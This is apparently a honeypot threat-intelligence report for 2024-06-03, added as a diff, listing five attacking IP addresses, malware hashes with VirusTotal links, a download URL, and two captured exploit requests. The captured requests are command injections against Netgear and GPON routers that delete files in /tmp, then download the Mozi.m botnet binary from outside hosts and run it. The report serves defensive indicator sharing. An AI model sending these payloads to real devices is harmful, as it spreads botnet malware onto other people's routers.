@@ -1,0 +1,33 @@
+Top 5 IPs for 2024-06-03 :
+
+198.27.89.196
+14.103.39.179
+119.115.17.157
+115.63.52.144
+218.92.0.96
+
+
+Malware Observed:
+
+file name : sshd
+94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00
+https://www.virustotal.com/gui/file/94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00
+File downloaded from : http://42.5.227.183:23645/.i
+d5601202dff3017db238145ff21857415f663031aca9b3d534bec8991b12179a
+https://www.virustotal.com/gui/file/d5601202dff3017db238145ff21857415f663031aca9b3d534bec8991b12179a
+
+
+
+Commands/exploits observed:
+
+/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://95.132.72.31:58449/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
+
+POST /GponForm/diag_Form?images/ HTTP/1.1
+Host: 127.0.0.1:80
+Connection: keep-alive
+Accept-Encoding: gzip, deflate
+Accept: */*
+User-Agent: Hello, World
+Content-Length: 118
+
+XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+http://115.56.153.50:41274/Mozi.m+-O+->/tmp/gpon80;sh+/tmp/gpon80&ipv=0
